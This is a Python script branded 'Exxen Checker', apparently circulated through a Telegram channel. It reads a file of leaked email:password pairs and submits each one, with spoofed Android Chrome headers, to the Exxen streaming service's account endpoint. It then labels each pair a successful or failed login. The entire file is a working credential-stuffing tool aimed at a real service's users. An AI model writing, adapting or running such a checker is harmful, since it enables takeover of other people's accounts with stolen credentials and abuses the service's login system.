import requests
import threading
from termcolor import colored
from cfonts import render
import time
import webbrowser


E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Chanel  : {B} | JED ~ ARCHIVE
|{Z}[+] Tool  : {B} Exxen Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

exxenhit = input("Dosya Adı Girin : ")

headers = {
    'authority': 'mw-proxy.app.exxen.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.exxen.com',
    'referer': 'https://www.exxen.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

with open(exxenhit, 'r') as file:
    for line in file:
        try:
            email, password = line.strip().split(':')
            json_data = {
                'email': email,
                'password': password,
            }
            response = requests.post('https://mw-proxy.app.exxen.com/user/search', headers=headers, json=json_data)
            data = response.json()

            if data.get('statusCode') == 404 and data.get('message') == 'EV Exception: calling search account: No accounts found':
                print(f'Giriş Başarısız. ❌ {email} | {password}')
                print("\x1b[1;39m—" * 60)
            else:
                print(f'Giriş Başarılı. ✅ {email} | {password}')
            print("\x1b[1;39m—" * 60)
        except Exception as e:
            print(f"Hata: {e}")
            continue
   
